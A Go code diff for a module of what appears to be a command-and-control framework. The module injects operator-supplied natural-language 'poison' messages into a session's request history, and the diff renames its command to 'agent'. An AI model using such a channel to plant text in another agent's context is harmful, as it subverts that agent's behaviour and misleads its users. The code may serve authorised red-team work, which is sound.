@@ -8,15 +8,13 @@ import (
 	log "github.com/sirupsen/logrus"
 )
 
-// PoisonModule handles the "poison" C2 command by injecting a natural-language
-// message into the session's request history.
+// PoisonModule handles the "agent" C2 command by injecting a natural-language
+// message into the session's request history (poison injection).
 type PoisonModule struct{}
 
-func (m *PoisonModule) Name() string { return "poison" }
+func (m *PoisonModule) Name() string { return "agent" }
 
 func (m *PoisonModule) Handle(ctx ModuleContext, sessionID string, taskID uint32, spite *implantpb.Spite) {
-	ctx.Tasks.Create(sessionID, taskID, m.Name())
-
 	req := spite.GetRequest()
 	if req == nil || req.Input == "" {
 		ctx.SendSpite(sessionID, taskID, execSpite("missing poison text"))
@@ -33,7 +31,7 @@ func (m *PoisonModule) Handle(ctx ModuleContext, sessionID string, taskID uint32
 		CreatedAt: time.Now(),
 	}
 
-	if ctx.WaitForSession(sessionID, 30*time.Second) == nil {
+	if ctx.WaitForSession(sessionID, DefaultSessionTimeout) == nil {
 		log.Errorf("[bridge] failed to enqueue poison message for session %s: session not found", sessionID)
 		ctx.Tasks.Fail(sessionID, taskID, "session not found")
 		return
